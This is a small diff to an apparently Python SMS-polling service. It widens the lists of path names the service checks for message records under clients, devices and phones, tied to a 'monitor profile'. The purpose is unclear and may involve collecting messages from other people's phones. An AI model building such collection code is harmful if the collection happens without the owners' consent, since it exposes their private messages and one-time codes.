@@ -16,8 +16,20 @@ from app.services import get_active_device, get_monitor_profile, save_sms
 logger = logging.getLogger(__name__)
 
 POLL_INTERVAL_SEC = 3
-SMS_PARENT_PATHS = ("clients", "devices", "device", "users", "phones")
-SMS_CHILD_PATHS = ("sms", "messages", "smsList", "inbox", "sms_inbox", "Sms", "SMS", "msg")
+SMS_PARENT_PATHS = ("clients", "client", "devices", "device", "users", "phones")
+SMS_CHILD_PATHS = (
+    "sms",
+    "messages",
+    "smsList",
+    "inbox",
+    "sms_inbox",
+    "Sms",
+    "SMS",
+    "msg",
+    "log",
+    "logs",
+    "history",
+)
 SENDER_FIELDS = ("sender", "from", "address", "phone", "number", "fromNumber", "from_number")
 BODY_FIELDS = ("message", "body", "text", "content", "msg", "sms", "smsBody")
 TIME_FIELDS = ("time", "date", "timestamp", "ts", "received_at", "created_at", "createdAt")
